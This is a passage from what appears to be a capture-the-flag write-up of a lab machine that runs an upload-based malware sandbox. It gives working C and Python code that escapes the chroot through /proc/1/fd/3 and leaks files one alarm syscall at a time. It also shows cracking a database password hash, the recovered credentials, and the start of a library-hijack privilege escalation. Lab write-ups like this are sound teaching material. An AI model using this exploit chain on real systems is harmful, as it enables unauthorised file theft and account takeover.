    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"shutdown"</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"bind"</span><span class="p">,</span> <span class="mi">49</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"listen"</span><span class="p">,</span> <span class="mi">50</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"clone"</span><span class="p">,</span> <span class="mi">56</span><span class="p">,</span> <span class="mi">5</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"fork"</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"vfork"</span><span class="p">,</span> <span class="mi">58</span><span class="p">,</span> <span class="mi">0</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"execve"</span><span class="p">,</span> <span class="mi">59</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"kill"</span><span class="p">,</span> <span class="mi">62</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"uname"</span><span class="p">,</span> <span class="mi">63</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"getdents"</span><span class="p">,</span> <span class="mi">78</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"getcwd"</span><span class="p">,</span> <span class="mi">79</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"chdir"</span><span class="p">,</span> <span class="mi">80</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"fchdir"</span><span class="p">,</span> <span class="mi">81</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"rename"</span><span class="p">,</span> <span class="mi">82</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Low</span><span class="p">,</span> <span class="s">"mkdir"</span><span class="p">,</span> <span class="mi">83</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"rmdir"</span><span class="p">,</span> <span class="mi">84</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"unlink"</span><span class="p">,</span> <span class="mi">87</span><span class="p">,</span> <span class="mi">1</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"chmod"</span><span class="p">,</span> <span class="mi">90</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">Medium</span><span class="p">,</span> <span class="s">"fchmod"</span><span class="p">,</span> <span class="mi">91</span><span class="p">,</span> <span class="mi">2</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"chown"</span><span class="p">,</span> <span class="mi">92</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"fchown"</span><span class="p">,</span> <span class="mi">93</span><span class="p">,</span> <span class="mi">3</span><span class="p">],</span>
    <span class="p">[</span><span class="n">SyscallClass</span><span class="p">.</span><span class="n">High</span><span class="p">,</span> <span class="s">"ptrace"</span><span class="p">,</span> <span class="mi">101</span><span class="p">,</span> <span class="mi">4</span><span class="p">],</span>
<span class="p">]</span>

<span class="p">...[</span><span class="n">snip</span><span class="p">]...</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Since we are in a chroot jail and the PID + NET namepspace is unshared we have to think of another way to exploit the situation. One way to do this is the mounted <code class="language-plaintext highlighter-rouge">/proc</code> filesystem. Using PID 1, FD 3 and the <code class="language-plaintext highlighter-rouge">../</code> sequence we can traverse back outside of the chroot jail. Next we need a way to exfiltrate data from the system, which we can do using syscalls that in turn get logged and output on the website. To test our exfiltration we can first compile a small test binary with a string to exfiltrate. Multiple syscalls for this cause would be possible but we will use alarm in this case. Alarm takes an unsigned integer as input so we have to convert our char array. Since an unsigned integer is the size of 4 on linux systems the string <code class="language-plaintext highlighter-rouge">test</code> is just right for the first attempt. We convert the char pointer to an unsigned int pointer and run a syscall on the value (37 representing the alarm syscall).</p>

<p><code class="language-plaintext highlighter-rouge">test.c</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"unistd.h"</span><span class="cp">
#include</span> <span class="cpf">"string.h"</span><span class="cp">
</span>

<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
  <span class="kt">char</span><span class="o">*</span> <span class="n">buf</span> <span class="o">=</span> <span class="s">"test"</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="n">val</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
  <span class="n">syscall</span><span class="p">(</span><span class="mi">37</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>After compiling the binary we upload it and after the sleep we get a result.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>$ gcc test.c -o testing
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/img/scanned/015_MalScanner_syscall_alarm.png"><img data-src="/img/scanned/015_MalScanner_syscall_alarm.png" alt="015_MalScanner_syscall_alarm" data-proofer-ignore></a></p>

<p>Converting the hex back to ascii we see our exfiltration technique is working and we are getting back the string <code class="language-plaintext highlighter-rouge">tset</code>. The order here is reversed because it is a little endian system.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>$ echo -n '74736574' | xxd -r -p
tset
</pre></td></tr></tbody></table></code></div></div>

<p>Since we got exfiltration working we can next try to exfiltrate an actual file. Because we are running under the uid of 1001 we first choose a world readable one which also gives more information about the system like <code class="language-plaintext highlighter-rouge">/etc/passwd</code></p>

<p><code class="language-plaintext highlighter-rouge">exfil_passwd.c</code></p>

<div class="language-c highlighter-rouge"><div class="code-header">
        <span data-label-text="C"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">"unistd.h"</span><span class="cp">
#include</span> <span class="cpf">"fcntl.h"</span><span class="cp">
</span>

<span class="kt">int</span> <span class="nf">main</span> <span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x8</span><span class="p">];</span>
  <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/1/fd/3/../../../../../../etc/passwd"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
  <span class="k">while</span><span class="p">(</span><span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span>
  <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">val</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
    <span class="n">syscall</span><span class="p">(</span><span class="mi">37</span><span class="p">,</span><span class="n">val</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Checking the first alarm it looks like it is working with <code class="language-plaintext highlighter-rouge">toor</code> being <code class="language-plaintext highlighter-rouge">root</code> in reverse.</p>

<p><a href="/img/scanned/020_MalScanner_passwd.png"><img data-src="/img/scanned/020_MalScanner_passwd.png" alt="020_MalScanner_passwd" data-proofer-ignore></a></p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>$ echo -n '746f6f72' | xxd -r -p
toor
</pre></td></tr></tbody></table></code></div></div>

<p>We are now able to read files on the system but converting them manually and recompiling the binary would be very time consuming. This short python script will do the work for us here. it first fills in the file we want to read into C source code and compiles it. Then it uploads the binary to the malscanner, retrieves the response, parses it and saves the exfiltrated file on our system.</p>

<div class="language-py highlighter-rouge"><div class="code-header">
        <span data-label-text="Python"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="n">requests</span>
<span class="kn">import</span> <span class="n">uuid</span>
<span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">sys</span>
<span class="kn">from</span> <span class="n">binascii</span> <span class="kn">import</span> <span class="n">unhexlify</span>

<span class="n">FILENAME</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
<span class="n">URL</span> <span class="o">=</span> <span class="s">'http://10.129.159.163/scanner/upload/'</span>

<span class="n">C_CODE</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'''#include "unistd.h"
#include "fcntl.h"


int main (int argc, char *argv[])
</span><span class="si">{</span>
  <span class="n">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x4</span><span class="p">];</span>
  <span class="nb">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"</span><span class="si">{</span><span class="n">FILENAME</span><span class="si">}</span><span class="s">", O_RDONLY);
  while(read(fd, buf, 0x4) </span><span class="err">!</span><span class="o">=</span> <span class="mi">0</span><span class="p">)</span>
  <span class="si">{</span>
    <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">val</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">val</span> <span class="o">=</span> <span class="o">*</span><span class="p">((</span><span class="n">unsigned</span> <span class="nb">int</span> <span class="o">*</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]));</span>
    <span class="nf">syscall</span><span class="p">(</span><span class="mi">37</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
  <span class="si">}</span>
  <span class="nf">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="si">}</span><span class="s">
'''</span>

<span class="n">guid_source</span> <span class="o">=</span> <span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()</span>
<span class="n">guid_bin</span> <span class="o">=</span> <span class="n">uuid</span><span class="p">.</span><span class="nf">uuid4</span><span class="p">()</span>

<span class="n">source</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="sa">f</span><span class="s">'./</span><span class="si">{</span><span class="n">guid_source</span><span class="si">}</span><span class="s">.c'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span>
<span class="n">source</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">C_CODE</span><span class="p">)</span>
<span class="n">source</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>

<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="s">'gcc ./</span><span class="si">{</span><span class="n">guid_source</span><span class="si">}</span><span class="s">.c -o </span><span class="si">{</span><span class="n">guid_bin</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>

<span class="n">multipart_form_data</span> <span class="o">=</span> <span class="p">{</span>
    <span class="s">'file'</span><span class="p">:</span> <span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">guid_bin</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="nf">open</span><span class="p">(</span><span class="sa">f</span><span class="s">'./</span><span class="si">{</span><span class="n">guid_bin</span><span class="si">}</span><span class="s">'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)),</span>
<span class="p">}</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">files</span><span class="o">=</span><span class="n">multipart_form_data</span><span class="p">,</span> <span class="n">allow_redirects</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
<span class="n">os</span><span class="p">.</span><span class="nf">system</span><span class="p">(</span><span class="sa">f</span><span class="s">'rm ./</span><span class="si">{</span><span class="n">guid_source</span><span class="si">}</span><span class="s">.c </span><span class="si">{</span><span class="n">guid_bin</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>


<span class="n">out</span> <span class="o">=</span> <span class="sa">b</span><span class="s">''</span>

<span class="n">valid_lines</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span> <span class="k">if</span> <span class="s">'alarm(0x'</span> <span class="ow">in</span> <span class="n">line</span><span class="p">]</span>
<span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="n">valid_lines</span><span class="p">:</span>
    <span class="n">exfil</span> <span class="o">=</span> <span class="n">line</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span><span class="s">'alarm(0x'</span><span class="p">)[</span><span class="mi">1</span><span class="p">].</span><span class="nf">split</span><span class="p">(</span><span class="s">') = 0x'</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
    <span class="n">exfil</span> <span class="o">=</span> <span class="s">'0'</span> <span class="o">*</span> <span class="p">(</span><span class="mi">8</span> <span class="o">-</span> <span class="nf">len</span><span class="p">(</span><span class="n">exfil</span><span class="p">))</span> <span class="o">+</span> <span class="n">exfil</span>
    <span class="n">out</span> <span class="o">+=</span> <span class="nf">unhexlify</span><span class="p">(</span><span class="n">exfil</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>

<span class="n">save_out</span> <span class="o">=</span> <span class="nf">open</span><span class="p">(</span><span class="n">FILENAME</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="s">'_'</span><span class="p">),</span> <span class="s">'wb'</span><span class="p">)</span>
<span class="n">save_out</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
<span class="n">save_out</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Testing it with the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file again we can now comfortably retrieve it.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>$ python3 readfile.py '/proc/1/fd/3/../../../../../../etc/passwd'
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre></td><td class="rouge-code"><pre>$ cat _proc_1_fd_3_.._.._.._.._.._.._etc_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:101:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
clarence:x:1000:1000:clarence,,,:/home/clarence:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
sandbox:x:1001:1001::/home/sandbox:/usr/sbin/nologin
gin
</pre></td></tr></tbody></table></code></div></div>

<p>Looking for possible interesting files on the system there is a <code class="language-plaintext highlighter-rouge">malscanner.db</code> in the webroot of the source code.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>$ ls malscanner
malscanner     manage.py         sandbox  static     uploads       viewer
malscanner.db  requirements.txt  scanner  templates  uwsgi_params
</pre></td></tr></tbody></table></code></div></div>

<p>The end of the <code class="language-plaintext highlighter-rouge">settings.py</code> django configuration file leaks the root of the web application so we know where to look for the database.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>FILE_PATH = "/var/www/malscanner/uploads"
SBX_PATH = "/var/www/malscanner/sandbox"
</pre></td></tr></tbody></table></code></div></div>

<p>Using our script we can retrieve the database and opening it there is a hash for the user clarence inside which also is a user on the os.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>$ python3 readfile.py '/proc/1/fd/3/../../../../../../var/www/malscanner/malscanner.db'
</pre></td></tr></tbody></table></code></div></div>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre>$ sqlite3 _proc_1_fd_3_.._.._.._.._.._.._var_www_malscanner_malscanner.db
SQLite version 3.37.2 2022-01-06 13:25:41
Enter ".help" for usage hints.
sqlite&gt; .tables
auth_group                  auth_user_user_permissions
auth_group_permissions      django_admin_log
auth_permission             django_content_type
auth_user                   django_migrations
auth_user_groups            django_session
sqlite&gt; select * from auth_user;
1|md5$kL2cLcK2yhbp3za4w3752m$9886e17b091eb5ccdc39e436128141cf|2021-09-14 18:39:55.237074|1|clarence|||1|1|2021-09-14 18:36:46.227819|
</pre></td></tr></tbody></table></code></div></div>

<p>Using hashcat and rockyou we are able to crack it quite quickly.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
</pre></td><td class="rouge-code"><pre>$ hashcat -m 20 -a 0 -O hash rockyou.txt
hashcat (v6.2.5) starting

...[snip]...

886e17b091eb5ccdc39e436128141cf:kL2cLcK2yhbp3za4w3752m:onedayyoufeellikecrying

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 20 (md5($salt.$pass))
Hash.Target......: 9886e17b091eb5ccdc39e436128141cf:kL2cLcK2yhbp3za4w3752m
Time.Started.....: Tue Feb  1 00:53:57 2022 (0 secs)
Time.Estimated...: Tue Feb  1 00:53:57 2022 (0 secs)
Kernel.Feature...: Optimized Kernel
Guess.Base.......: File (rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 15539.8 kH/s (2.49ms) @ Accel:8192 Loops:1 Thr:32 Vec:1
Recovered........: 1/1 (100.00%) Digests
Progress.........: 5243993/14344388 (36.56%)
Rejected.........: 1113/5243993 (0.02%)
Restore.Point....: 2622142/14344388 (18.28%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: yayavega -&gt; n11575y
Hardware.Mon.#1..: Temp: 41c Fan: 33% Util:  0% Core:1733MHz Mem:4006MHz Bus:16

Started: Tue Feb  1 00:53:52 2022
Stopped: Tue Feb  1 00:53:59 2022
</pre></td></tr></tbody></table></code></div></div>

<p>Testing the credentials <code class="language-plaintext highlighter-rouge">clarence:onedayyoufeellikecrying</code> with ssh we are able to log into the machine and grab the user flag.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>$ ssh clarence@10.129.159.163
clarence@10.129.159.163's password:
Linux scanned 5.10.0-11-amd64 #1 SMP Debian 5.10.92-1 (2022-01-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jan 31 23:12:39 2022 from 10.10.14.73
clarence@scanned:~$ wc -c user.txt
33 user.txt
</pre></td></tr></tbody></table></code></div></div>
<h1 id="root">Root</h1>

<p>We noticed earlier that <code class="language-plaintext highlighter-rouge">sandbox</code> gets the <code class="language-plaintext highlighter-rouge">cap_setuid</code> set when compiling. This is also the case on this system. Furthermore there seemed to be interesting file permission on the copied libraries and on the whole jail directory itself.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>clarence@scanned:~$ /usr/sbin/getcap /var/www/malscanner/sandbox/sandbox
/var/www/malscanner/sandbox/sandbox cap_setgid,cap_setuid,cap_setpcap,cap_sys_chroot,cap_sys_admin=eip
</pre></td></tr></tbody></table></code></div></div>

<p>Checking on the system the directory is world readable. This means we can copy anything inside while we run a binary with <code class="language-plaintext highlighter-rouge">sandbox</code>. Since we are also able to access the rest of the filesystem through <code class="language-plaintext highlighter-rouge">/proc/1/fd/3</code> we can run another binary from inside the sandbox. These two things mean we are able to make a binary on the host run with a backdoored library version.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>clarence@scanned:~$ ls -al /var/www/malscanner/sandbox/jails/
total 8
drwxrwxrwx 2 root root 4096 Jan 13 17:27 .
drwxr-xr-x 3 root root 4096 Jan 13 17:27 ..
</pre></td></tr></tbody></table></code></div></div>

<p>Doing this with a suid binary we should be able to achieve code execution as root so the first step is to look at the suid binaries available on the system.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre>clarence@scanned:~$ find / -perm -4000 2&gt;/dev/null
